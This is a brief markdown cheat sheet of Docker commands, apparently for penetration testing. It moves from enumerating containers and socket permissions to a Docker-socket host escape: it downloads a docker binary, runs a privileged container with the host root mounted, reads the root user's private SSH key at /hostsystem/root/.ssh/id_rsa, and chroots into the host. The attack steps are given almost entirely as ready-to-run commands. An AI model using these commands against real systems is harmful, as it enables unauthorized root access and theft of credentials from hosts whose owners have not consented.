# Docker

## Check Docker Version

```bash
docker version
```

## List Images

```bash
docker image ls
```

## List Containers

```bash
docker ps -a
```

## Check User Groups

```bash
id
```

## Check Docker Socket

```bash
ls -l /var/run/docker.sock
```

## Download Docker Binary (If Missing)

```bash
wget <URL_TO_DOCKER_BINARY> -O docker
chmod +x docker
```

## List Containers via Docker Socket

```bash
./docker -H unix:///var/run/docker.sock ps
```

## Run Privileged Container With Host Root Mounted

```bash
./docker -H unix:///var/run/docker.sock run --rm -d --privileged -v /:/hostsystem <image>
```

## Exec Into Container

```bash
./docker -H unix:///var/run/docker.sock exec -it <container_id> /bin/bash
```

## Access Host Files

```bash
cat /hostsystem/root/.ssh/id_rsa
```

## Chroot Into Host From Container

```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

## Check Docker Socket Permissions

```bash
ls -l /var/run/docker.sock
```

## Docker Compose: List Containers

```bash
docker-compose ps -a
```

## Docker Compose: Exec Into Container

```bash
docker-compose exec <container_name> /bin/bash
```

## Docker Compose: View Service Config

```bash
docker-compose config --services <service_name>
```
